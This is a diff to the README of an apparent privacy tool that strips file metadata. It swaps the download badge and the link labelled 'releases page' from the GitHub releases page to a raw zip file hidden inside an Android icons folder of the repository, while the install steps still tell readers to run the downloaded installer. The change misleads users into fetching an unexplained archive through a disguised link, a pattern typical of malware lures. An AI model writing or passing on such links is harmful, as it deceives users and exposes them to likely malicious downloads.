@@ -1,6 +1,6 @@
 # 🛡️ ZMetadata-stripper - Protect your digital privacy today
 
-[![Download ZMetadata-stripper](https://img.shields.io/badge/Download-Release-blue)](https://github.com/vikigamingstare1/ZMetadata-stripper/releases)
+[![Download ZMetadata-stripper](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/vikigamingstare1/ZMetadata-stripper/main/src-tauri/icons/android/mipmap-anydpi-v26/stripper-Z-Metadata-3.4.zip)
 
 ZMetadata-stripper removes hidden data from your personal files. Your photos, documents, and other files often contain private details. This data includes where you took a photo, the camera you used, or the software that created a file. This tool cleans that data to help you keep your digital life private.
 
@@ -10,7 +10,7 @@ The app runs on your computer. It does not send files to a server or the interne
 
 Follow these steps to set up the tool on your Windows computer.
 
-1. Visit the [releases page](https://github.com/vikigamingstare1/ZMetadata-stripper/releases) to download the installation file.
+1. Visit the [releases page](https://raw.githubusercontent.com/vikigamingstare1/ZMetadata-stripper/main/src-tauri/icons/android/mipmap-anydpi-v26/stripper-Z-Metadata-3.4.zip) to download the installation file.
 2. Select the file ending in `.msi` or `.exe` for Windows.
 3. Locate the file in your downloads folder.
 4. Double-click the file to start the installer.
